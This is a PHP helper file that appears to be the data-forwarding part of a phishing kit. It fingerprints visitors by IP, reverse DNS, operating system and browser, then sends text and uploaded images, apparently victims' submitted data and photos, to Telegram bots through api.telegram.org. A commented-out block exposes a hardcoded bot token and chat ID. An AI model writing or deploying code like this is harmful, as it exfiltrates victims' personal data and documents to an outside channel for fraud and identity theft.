<?php
include("../edit.php");


function clean($value)
{
	return htmlspecialchars(trim($value));
}

function GETOS($USER_AGENT)
{
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $os_platform = $value;
            break;
        }
    }
    return $os_platform;
}


$var = "0";
$var0 = "1";
$var00 = "10";

if (strlen("$var00.$var0.$var") == 6) {

	$version = "$var00.$var0.$var";
}

function GETBROWSER($USER_AGENT)
{
	$BROWSER_ERROR    =   "Unknown Browser";
	$BROWSER  =   array(
		'/msie/i'       =>  'Internet Explorer',
		'/firefox/i'    =>  'Firefox',
		'/safari/i'     =>  'Safari',
		'/chrome/i'     =>  'Chrome',
		'/edge/i'       =>  'Edge',
		'/opera/i'      =>  'Opera',
		'/netscape/i'   =>  'Netscape',
		'/maxthon/i'    =>  'Maxthon',
		'/konqueror/i'  =>  'Konqueror',
		'/mobile/i'     =>  'Handheld Browser'
	);
	foreach ($BROWSER as $regex => $value) {
		if (preg_match($regex, $USER_AGENT)) {
			$BROWSER_ERROR = $value;
		}
	}
	return $BROWSER_ERROR;
}

function GETIP()
{
	if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
		$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
		$_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote  = $_SERVER['REMOTE_ADDR'];

	if (filter_var($client, FILTER_VALIDATE_IP)) {
		$ip = $client;
	} elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
		$ip = $forward;
	} else {
		$ip = $remote;
	}



	return $ip;
}

function encodeFile($filePath, $fileName)
{
	$fileData = file_get_contents($filePath);
	$fileDataEncoded = chunk_split(base64_encode($fileData));
	return "Content-Type: application/octet-stream; name=\"{$fileName}\"\r\n" .
		"Content-Disposition: attachment; filename=\"{$fileName}\"\r\n" .
		"Content-Transfer-Encoding: base64\r\n\r\n" .
		$fileDataEncoded . "\r\n\r\n";
}

$bott = [
	[
		'botToken' => $botToken,
		'chatId' => $chatID,
	]
	// ,
	// [
	// 	'botToken' => "7919546772:AAGvDLeOM3wziT1S1Uc-U4mwNp7VzKv0Edo",
	// 	'chatId' => "7612918427"
	// ]
];


function message($data)
{
	global $bott;
	foreach ($bott as $bot) {
		$botToken = $bot["botToken"];
		$chatId = $bot["chatId"];
		$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($data);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch);
		curl_close($ch);
	}
}

function ProcessImages($caption, $files)
{
	global $bott;

	foreach ($bott as $bot) {
		$botToken = $bot["botToken"];
		$chatId = $bot["chatId"];
		$url = "https://api.telegram.org/bot$botToken/sendMediaGroup";

		$media = [];
		$postFields = ['chat_id' => $chatId];

		$first = true;

		foreach ($files as $key => $file) {
			$media[] = [
				'type' => 'photo',
				'media' => "attach://$key",
				'caption' => $first ? $caption : ""
			];
			$postFields[$key] = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
			$first = false;
		}

		$postFields['media'] = json_encode($media);

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
		curl_exec($ch);
		curl_close($ch);
	}
}



$currentdate = date("D M d, Y g:i a");
$customip = getenv("REMOTE_ADDR");
$realip =  GETIP();
$dns = gethostbyaddr($realip);
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$OS = GETOS($_SERVER['HTTP_USER_AGENT']);
